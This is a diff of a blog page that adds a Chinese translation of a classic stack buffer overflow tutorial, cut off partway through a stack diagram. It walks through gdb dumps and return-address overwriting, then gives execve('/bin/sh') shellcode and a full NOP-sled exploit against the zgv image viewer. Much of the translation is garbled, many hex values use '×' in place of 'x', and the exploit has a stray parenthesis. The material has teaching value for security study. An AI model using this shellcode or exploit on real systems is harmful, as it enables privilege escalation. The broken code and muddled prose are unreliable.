-              ds.type = 'text/javascript';
-              ds.async = true;
-              ds.src = (document.location.protocol == 'https:' ? 'https:' :
-                  'http:') +
-                '//static.duoshuo.com/embed.js';
-              ds.charset = 'UTF-8';
-              (document.getElementsByTagName('head')[0] || document.getElementsByTagName(
-                'body')[0]).appendChild(ds);
-            })();
-
-          </script>
-          <!-- 多说公共JS代码 end -->
-        </div>
-      </div>
-      <footer id="footer">
-        <div class="outer">
-          <div id="footer-info">
-            <div class="footer-left">
-              &copy; 2015 science09
-            </div>
-            <div class="footer-right">
-              <a href="http://hexo.io/" target="_blank">Hexo</a> Theme
-              <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
-            </div>
-          </div>
-        </div>
-      </footer>
-
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">science09</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="http://tp2.sinaimg.cn/2445097485/180/5736689505/1" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author">science09</h1>
+			</hgroup>
+			
+			<p class="header-subtitle">一分耕耘一分收获</p>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/science09" title="github">github</a>
+			        
+						<a class="weibo" target="_blank" href="http://weibo.com/u/2445097485" title="weibo">weibo</a>
+			        
+						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+			        
+						<a class="zhihu" target="_blank" href="/#" title="zhihu">zhihu</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-缓冲区溢出攻击" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2014/07/31/缓冲区溢出攻击/" class="article-date">
+  	<time datetime="2014-07-31T15:24:42.000Z" itemprop="datePublished">2014-07-31</time>
+</a>
     </div>
-    <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      缓冲区溢出攻击
+    </h1>
+  
 
-    <script>
-      var yiliaConfig = {
-        fancybox: true,
-        mathjax: true,
-        animate: true,
-        isHome: false,
-        isPost: true,
-        isArchive: false,
-        isTag: false,
-        isCategory: false,
-        open_in_new: false
-      }
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/攻击/">攻击</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/缓冲区溢出/">缓冲区溢出</a></li></ul>
+	</div>
 
-    </script>
-    <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js" type="text/javascript"></script>
-    <script src="/js/main.js" type="text/javascript"></script>
-
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Config({ tex2jax: { inlineMath: [ ['$','$'], ["\\(","\\)"] ], processEscapes:
-      true, skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-      } }); MathJax.Hub.Queue(function() { var all = MathJax.Hub.getAllJax(), i;
-      for(i=0; i
-      < all.length; i +=1 ) { all[i].SourceElement().parentNode.className +=' has-jax'
-      ; } }); </script>
-
-        <script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+        
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/技术/">技术</a>
+	</div>
 
 
-        </script>
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>缓冲区溢出出现在用户输入的相关缓冲区内，在一般情况下，这是现在的计算机和网络上的最大的安全隐患之一。这是因为在编程的层次上很容易出现这中问题，这对于不明白或是无法获得源代码的使用者来说是不可见的，很多的这种问题就会被利用。本文就是企图教会新手-C程序员，证明怎么利用一个溢出环境。<br><a id="more"></a></p>
+<h4 id="1-内存">1.内存</h4><p>注：我这里的描述方式是在大多数计算机上内存是进程的组织者，但是它是依赖处理器体系结构的类型。这是一个x86的例子，同时也可以大致应用在sparc。</p>
+<p>缓冲区溢出的攻击原理是不应该是重写随机输入和在进程中执行代码的内存的重写。要看在什么地方和怎么发生的溢出，让我们来看下内存是如何组织的。页面是使用自己相关地址的内存的一个部分，这就意味着内核的进程的初始化，这就没有必要知道在RAM中存储的物理地址。进程内存由下面三个部分组成：</p>
+<p>代码段，在这一段代码中你的数据是通过汇编指令在处理器中执行的。该代码执行是非线性的，它可以跳过代码，跳跃，在某种条件下调用函数。以此，我们使用EIP指针，或是指针指令。其中EIP指向的地址总是包含下一个执行代码。</p>
+<p>数据段，变量空间和动态缓冲器。</p>
+<p>堆栈段，这是用来给函数传递变量的和和作为函数变量的空间。在栈的底部位于每一页的虚拟内存的尽头，同时向下增长。汇编命令PUSHL会增加到栈的顶部，POPL会从栈的顶部移除项目并且把它们放到寄存器中。要直接访问栈寄存器，在栈的顶部有栈顶指针ESP。</p>
+<h4 id="2-函数">2.函数</h4><p>函数是一段代码段的代码，当被调用执行一个任务，之后返回执行的前一个主题。或是，把参数传递给函数，在汇编语言中，通常看起来是这样的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">memory address                       code</span><br><span class="line"><span class="number">0x8054321</span>               pushl $<span class="number">0x0</span></span><br><span class="line"><span class="number">0x8054322</span>                              call $<span class="number">0x80543a0</span> </span><br><span class="line"><span class="number">0x8054327</span>                              ret</span><br><span class="line"><span class="number">0x8054328</span>                              leave</span><br><span class="line">...</span><br><span class="line"><span class="number">0x80543a0</span>               popl %eax</span><br><span class="line"><span class="number">0x80543a1</span>                              addl $<span class="number">0x1337</span>,%eax</span><br><span class="line"><span class="number">0x80543a4</span>                              ret</span><br></pre></td></tr></table></figure>
+<p>这会发生什么?主函数调用了function(0);</p>
+<p>变量是0，主要把它压入栈中，同时调用该函数。该函数使用popl来获取栈中的变量。完成后，返回0x8054327。通常，主函数要把EBP寄存器压入栈中，主要是储存和在结束后在储存。这是帧指针的概念，即允许函数使用自己的偏移地址，在对付攻击时就变的很无趣了。因为函数将不会返回到原有的执行线程。</p>
+<p>我们只需要知道栈。在顶部，我们有函数的内部缓冲区和变量。在此之后，有保存的EBP寄存器(32位，4个字节)，然后返回地址，是另外的4个字节。再往下，还有要传递给函数的参数，这对我们没有用。</p>
+<p>在这种情况下，我们返回的地址是0x8054327。在函数被调用时，它就会自动的存储到栈中。如果代码中存在溢出的地方，这个返回值会被覆盖，并且指针指向下内存中的下一个位置。</p>
+<h4 id="3-一个可以利用的程序实例">3.一个可以利用的程序实例</h4><p>让我们假设我们要利用的函数为：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">void lame (void) &#123; char small[30]; gets (small); printf("%s\n", small); &#125;</span><br><span class="line"></span><br><span class="line">main() &#123; lame (); return 0; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Compile and disassemble it:</span><br><span class="line"></span><br><span class="line"># cc -ggdb blah.c -o blah</span><br><span class="line"></span><br><span class="line">/tmp/cca017401.o: In function `lame':</span><br><span class="line"></span><br><span class="line">/root/blah.c:1: the `gets' function is dangerous and should not be used.</span><br><span class="line"></span><br><span class="line"># gdb blah</span><br><span class="line"></span><br><span class="line">/* short explanation: gdb, the GNU debugger is used here to read the</span><br><span class="line"></span><br><span class="line">   binary file and disassemble it (translate bytes to assembler code) */</span><br><span class="line"></span><br><span class="line">(gdb) disas main</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">0x80484c8 :       pushl  %ebp</span><br><span class="line">0x80484c9 :     movl   %esp,%ebp</span><br><span class="line">0x80484cb :     call   0x80484a0</span><br><span class="line">0x80484d0 :     leave</span><br><span class="line">0x80484d1 :     ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(gdb) disas lame</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function lame:</span><br><span class="line"></span><br><span class="line">/* saving the frame pointer onto the stack right before the ret address */</span><br><span class="line">0x80484a0 :       pushl  %ebp</span><br><span class="line">0x80484a1 :     movl   %esp,%ebp</span><br><span class="line"></span><br><span class="line">/* enlarge the stack by 0×20 or 32. our buffer is 30 characters, but the</span><br><span class="line">   memory is allocated 4byte-wise (because the processor uses 32bit words)</span><br><span class="line">   this is the equivalent to: char small[30]; */</span><br><span class="line"></span><br><span class="line">0x80484a3 :     subl   $0×20,%esp </span><br><span class="line"></span><br><span class="line">/* load a pointer to small[30] (the space on the stack, which is located</span><br><span class="line">   at virtual address 0xffffffe0(%ebp)) on the stack, and call</span><br><span class="line">   the gets function: gets(small); */</span><br><span class="line"></span><br><span class="line">0x80484a6 :     leal   0xffffffe0(%ebp),%eax</span><br><span class="line">0x80484a9 :     pushl  %eax</span><br><span class="line">0x80484aa :    call   0x80483ec</span><br><span class="line">0x80484af :    addl   $0×4,%esp</span><br><span class="line"></span><br><span class="line">/* load the address of small and the address of "%s\n" string on stack</span><br><span class="line">   and call the print function: printf("%s\n", small); */</span><br><span class="line"></span><br><span class="line">0x80484b2 :    leal   0xffffffe0(%ebp),%eax</span><br><span class="line">0x80484b5 :    pushl  %eax</span><br><span class="line">0x80484b6 :    pushl  $0x804852c</span><br><span class="line">0x80484bb :    call   0x80483dc</span><br><span class="line">0x80484c0 :    addl   $0×8,%esp</span><br><span class="line"></span><br><span class="line">/* get the return address, 0x80484d0, from stack and return to that address.</span><br><span class="line">   you don't see that explicitly here because it is done by the CPU as 'ret' */</span><br><span class="line"></span><br><span class="line">0x80484c3 :    leave</span><br><span class="line">0x80484c4 :    ret</span><br><span class="line"></span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+<h4 id="3-1_程序溢出">3.1 程序溢出</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># ./blah  </span><br><span class="line">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx    &lt;- user input</span><br><span class="line">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line"># ./blah  </span><br><span class="line">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx &lt;- user input</span><br><span class="line">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line"># gdb blah core</span><br><span class="line">(gdb) info registers</span><br><span class="line">     eax:       0×24          36</span><br><span class="line">     ecx:  0x804852f   134513967</span><br><span class="line">     edx:        0×1           1  </span><br><span class="line">     ebx:   0x11a3c8     1156040  </span><br><span class="line">     esp: 0xbffffdb8 -1073742408  </span><br><span class="line">     ebp:   0×787878     7895160</span><br></pre></td></tr></table></figure>
+<p>EBP是0x787878，这就意味我们已经写入了超出缓冲区输入可以控制的范围。0x78的x是十六进制的标志。该过程有32个字节的最大的缓冲器。我们已经在内存中写入了比用户输入更多的数据，因此重写EBP和返回值的地址是’xxxx’，这个过程会尝试在地址0x787878处重复执行，这就会导致段的错误。</p>
+<h4 id="3-2_改变返回值地址">3.2 改变返回值地址</h4><p>让我们尝试利用这个程序来返回lame()，我们要改变返回值的地址从0x80484d0到0x80484cb，在内存中，我们有32字节的缓冲区空间|4个字节保存EBP|4个字节的RET。下面是一个很简单的程序，把4个字节的返回地址变成一个1个字节字符缓冲区：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>; <span class="keyword">char</span> buf[<span class="number">44</span>];</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;=<span class="number">40</span>;i+=<span class="number">4</span>)</span><br><span class="line">    *(<span class="keyword">long</span> *) &amp;buf[i] = <span class="number">0x80484cb</span>;</span><br><span class="line">    <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor"># ret</span></span><br><span class="line">ËËËËËËËËËËË,</span><br><span class="line"><span class="preprocessor"># (ret;cat)|./blah</span></span><br><span class="line">test         &lt;- user input</span><br><span class="line">ËËËËËËËËËËË,test</span><br><span class="line">test         &lt;- user input</span><br><span class="line">test</span><br></pre></td></tr></table></figure>
+<p>我们在这里使用这个程序通过了函数两次。如果有溢出存在，函数的返回值地址是可以变的，从而改变程序的执行线程。</p>
+<h4 id="4-_Shellcode">4. Shellcode</h4><p>为了简单，Shellcode使用简单的汇编指令，我们写在栈上，然后更改返回地址，使它返回到栈内。使用这个方法，我们可以我们可以把代码插入到一个脆弱的进程中，然后在栈中正确的执行它。所以，让我们通过插入的汇编代码来运行一个Shell。一个常见的调用命令是execve()，它加载和运行任意的二进制代码，终止执行当前的进程。联机界面给我的应用：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">execve</span>  <span class="params">(<span class="keyword">const</span>  <span class="keyword">char</span>  *filename, <span class="keyword">char</span> *<span class="keyword">const</span> argv [], <span class="keyword">char</span> *<span class="keyword">const</span> envp[])</span></span>;  </span><br><span class="line">Lets get the details of the system call from glibc2:  </span><br><span class="line"><span class="preprocessor"># gdb /lib/libc.so<span class="number">.6</span>  </span></span><br><span class="line">(gdb) disas execve  </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function execve:  </span><br><span class="line"><span class="number">0x5da00</span> :       pushl  %ebx   </span><br><span class="line"><span class="comment">/* this is the actual syscall. before a program would call execve, it would  </span><br><span class="line">  push the arguments in reverse order on the stack: **envp, **argv, *filename */</span> </span><br><span class="line"><span class="comment">/* put address of **envp into edx register */</span> </span><br><span class="line"><span class="number">0x5da01</span> :     movl   <span class="number">0</span>×<span class="number">10</span>(%esp,<span class="number">1</span>),%edx  </span><br><span class="line"><span class="comment">/* put address of **argv into ecx register */</span> </span><br><span class="line"><span class="number">0x5da05</span> :     movl   <span class="number">0xc</span>(%esp,<span class="number">1</span>),%ecx  </span><br><span class="line"><span class="comment">/* put address of *filename into ebx register */</span> </span><br><span class="line"><span class="number">0x5da09</span> :     movl   <span class="number">0</span>×<span class="number">8</span>(%esp,<span class="number">1</span>),%ebx  </span><br><span class="line"><span class="comment">/* put 0xb in eax register; 0xb == execve in the internal system call table */</span> </span><br><span class="line"><span class="number">0x5da0d</span> :    movl   $<span class="number">0xb</span>,%eax  </span><br><span class="line"><span class="comment">/* give control to kernel, to execute execve instruction */</span> </span><br><span class="line"><span class="number">0x5da12</span> :    <span class="keyword">int</span>    $<span class="number">0</span>×<span class="number">80</span>  </span><br><span class="line">   </span><br><span class="line"><span class="number">0x5da14</span> :    popl   %ebx  </span><br><span class="line"><span class="number">0x5da15</span> :    cmpl   $<span class="number">0xfffff001</span>,%eax  </span><br><span class="line"><span class="number">0x5da1a</span> :    jae    <span class="number">0x5da1d</span> &lt;__syscall_error&gt;  </span><br><span class="line"><span class="number">0x5da1c</span> :    ret</span><br></pre></td></tr></table></figure>
+<p>结束汇编转存。</p>
+<h4 id="4-1_使代码可移植">4.1 使代码可移植</h4><p>我们必须应用一个策略使没有参数的Shellcode在内存中的传统方式，通过在它们的页存储上的精确位置，在编译中完成。</p>
+<p>一旦我们估计shellcode的大小，我们能够使用指令jmp和call来得到指定的字节在执行线程向前或是向后。为什么使用call?我们有机会使用CALL来自动的在栈内存储返回地址，这个返回地址是在下一个CALL指令后的4个字节。通过放置一个正确的变量通过使用call，我们间接的把地址压进了栈中，没有必要了解它。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0   jmp      (skip Z bytes forward)  </span><br><span class="line">2   popl %esi  </span><br><span class="line">… put function(s) here …  </span><br><span class="line">Z   call &lt;-Z+2&gt; (skip 2 less than Z bytes backward, to POPL)  </span><br><span class="line">Z+5 .string     (first variable)</span><br></pre></td></tr></table></figure>
+<p>(注：如果你要写的代码比一个简单的shell还要复杂，可以多次使用上面的代码。字符串放在代码的后面。你知道这些字符串的大小，因此可以计算他们的相对位置，一旦你知道第一个字符串的位置。)</p>
+<h4 id="4-2_Shellcode">4.2 Shellcode</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">global code_start           <span class="comment">/* we'll need this later, dont mind it */</span> </span><br><span class="line">global code_end  </span><br><span class="line">       .data  </span><br><span class="line">code_start:  </span><br><span class="line">       jmp  <span class="number">0</span>×<span class="number">17</span>  </span><br><span class="line">       popl %esi  </span><br><span class="line">       movl %esi,<span class="number">0</span>×<span class="number">8</span>(%esi)     <span class="comment">/* put address of **argv behind shellcode,  </span><br><span class="line">                               0×8 bytes behind it so a /bin/sh has place */</span> </span><br><span class="line">       xorl %eax,%eax            <span class="comment">/* put 0 in %eax */</span> </span><br><span class="line">       movb %eax,<span class="number">0</span>×<span class="number">7</span>(%esi)   <span class="comment">/* put terminating 0 after /bin/sh string */</span> </span><br><span class="line">       movl %eax,<span class="number">0xc</span>(%esi)    <span class="comment">/* another 0 to get the size of a long word */</span> </span><br><span class="line">my_execve:  </span><br><span class="line">       movb $<span class="number">0xb</span>,%al             <span class="comment">/* execve(         */</span> </span><br><span class="line">       movl %esi,%ebx           <span class="comment">/* "/bin/sh",      */</span> </span><br><span class="line">       leal <span class="number">0</span>×<span class="number">8</span>(%esi),%ecx      <span class="comment">/* &amp; of "/bin/sh", */</span> </span><br><span class="line">       xorl %edx,%edx           <span class="comment">/* NULL           */</span> </span><br><span class="line">       <span class="keyword">int</span> $<span class="number">0</span>×<span class="number">80</span>        <span class="comment">/* );           */</span> </span><br><span class="line">       call -<span class="number">0x1c</span>  </span><br><span class="line">       .<span class="built_in">string</span> <span class="string">"/bin/shX"</span>   <span class="comment">/* X is overwritten by movb %eax,0×7(%esi) */</span> </span><br><span class="line">code_end:</span><br></pre></td></tr></table></figure>
+<p>(相对偏移了0x17和-0x1c通过放在0x0，编译，反汇编和看看shell代码的大小。)</p>
+<p>这是一个正在工作着的shellcode，虽然很小。你至少使用exit()来调用和依附它(在调用之前)。Shellcode的正真的艺术还包括避免任何二进制0代码和修改它为例，二进制代码不包含控制和小写字符，这将会过滤掉一些问题程序。大多数的东西是通过自己修改代码来完成的，就是我们想的使用mov %eax,0×7(%esi)指令。我们用\0来取代X，但是在shellcode初始化中没有\0。</p>
+<p>让我们测试下这些代码，保存上面的代码为code.S和下面的文件为code.c：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">code_start</span><span class="params">()</span></span>;  </span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">code_end</span><span class="params">()</span></span>;  </span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line">main() &#123; ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>)) code_start)(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor"># cc -o code code.S code.c</span></span><br><span class="line"><span class="preprocessor"># ./code</span></span><br><span class="line">bash<span class="preprocessor">#</span></span><br></pre></td></tr></table></figure>
+<p>现在你可以把shellcode转变成16进制字符缓冲区。要做到这的最好的方法就是打印：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">code_start</span><span class="params">()</span></span>; <span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">code_end</span><span class="params">()</span></span>;</span><br><span class="line">main() &#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"%s"</span>,code_start);</span><br></pre></td></tr></table></figure>
+<p>通过使用aconv –h或bin2c.pl来解析它，可以在<a href="http://www.dec.net/~dhg或是http://members.tripod.com/mixtersecurity上找到工具。" target="_blank" rel="external">http://www.dec.net/~dhg或是http://members.tripod.com/mixtersecurity上找到工具。</a></p>
+<h4 id="5_写一个例子">5 写一个例子</h4><p>让我们看看如何改变返回地址指向的shellcode进行压栈，写一个攻击的例子。我们将要采用zgv，因为这是可以利用的一个最简单的事情。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># export HOME=`perl -e 'printf "a" x 2000'`</span><br><span class="line"># zgv</span><br><span class="line">Segmentation fault (core dumped)  </span><br><span class="line"># gdb /usr/bin/zgv core</span><br><span class="line">#0  0×61616161 in ?? ()</span><br><span class="line">(gdb) info register esp  </span><br><span class="line">     esp: 0xbffff574 -1073744524</span><br></pre></td></tr></table></figure>
+<p>那么，这是在栈顶的故障时间，安全的假设是我们能够使用这作为我们shellcode的返回地址。</p>
+<p>现在我们要在我们的缓冲区前增加一些NOP指令，所以我们没有必要对于我们内存中的shellcode的精确开始的预测100%的正确。这个函数将会返回到栈在我们的shellcode之前，通过这个方式使用NOPs的头文字JMP命令，跳转到CALL，在转回popl，在栈中运行我们的代码。</p>
+<p>记住，栈是这样的。在最低级的内存地址，ESP指向栈的顶部，初始变量被储存，即时缓冲器中的zgv储存了HOME环境变量。在那之后，我们保存了EBP和前一个函数的返回地址。我们必须要写8个字节或是更多在缓冲区后面，用栈中的新的地址来覆盖返回地址。</p>
+<p>Zgv缓冲器有1024个字节。你可以通过扫视代码来发现，或是通过在脆弱的函数中搜索初始化的subl $0×400,%esp (=1024)。我们可以把这些放在一起来利用。</p>
+<h4 id="5-1_zgv攻击实例">5.1 zgv攻击实例</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">/*                   zgv v3.0 exploit by Mixter  </span><br><span class="line">          buffer overflow tutorial – http://1337.tsx.org  </span><br><span class="line"></span><br><span class="line">        sample exploit, works for example with precompiled  </span><br><span class="line">    redhat 5.x/suse 5.x/redhat 6.x/slackware 3.x linux binaries */ </span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">   </span><br><span class="line">/* This is the minimal shellcode from the tutorial */ </span><br><span class="line">static char shellcode[]=  </span><br><span class="line">"\xeb\x17\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d"</span><br><span class="line">"\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58";</span><br><span class="line"></span><br><span class="line">#define NOP     0×90</span><br><span class="line">#define LEN     1032</span><br><span class="line">#define RET     0xbffff574</span><br><span class="line"></span><br><span class="line">int main()  </span><br><span class="line">&#123;  </span><br><span class="line">	char buffer[LEN];  </span><br><span class="line">	long retaddr = RET;  </span><br><span class="line">	int i;  </span><br><span class="line"></span><br><span class="line">fprintf(stderr,"using address 0x%lx\n",retaddr);  </span><br><span class="line"></span><br><span class="line">/* this fills the whole buffer with the return address, see 3b) */ </span><br><span class="line">for (i=0;i&lt;LEN;i+=4)  </span><br><span class="line">   *(long *)&amp;buffer[i] = retaddr;  </span><br><span class="line"></span><br><span class="line">/* this fills the initial buffer with NOP's, 100 chars less than the  </span><br><span class="line">   buffer size, so the shellcode and return address fits in comfortably */ </span><br><span class="line">for (i=0;i&lt;LEN-strlen(shellcode)-100);i++)  </span><br><span class="line">   *(buffer+i) = NOP;  </span><br><span class="line">   </span><br><span class="line">/* after the end of the NOPs, we copy in the execve() shellcode */ </span><br><span class="line">memcpy(buffer+i,shellcode,strlen(shellcode));  </span><br><span class="line"></span><br><span class="line">/* export the variable, run zgv */</span><br><span class="line">setenv("HOME", buffer, 1);  </span><br><span class="line">execlp("zgv","zgv",NULL);  </span><br><span class="line">return 0;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* EOF */ </span><br><span class="line"></span><br><span class="line">We now have a string looking like this:</span><br><span class="line">[ ... NOP NOP NOP NOP NOP JMP SHELLCODE CALL /bin/sh RET RET RET RET RET RET ]  </span><br><span class="line">While zgv's stack looks like this: </span><br><span class="line">v– 0xbffff574 is here  </span><br><span class="line">[     S   M   A   L   L   B   U   F   F   E   R   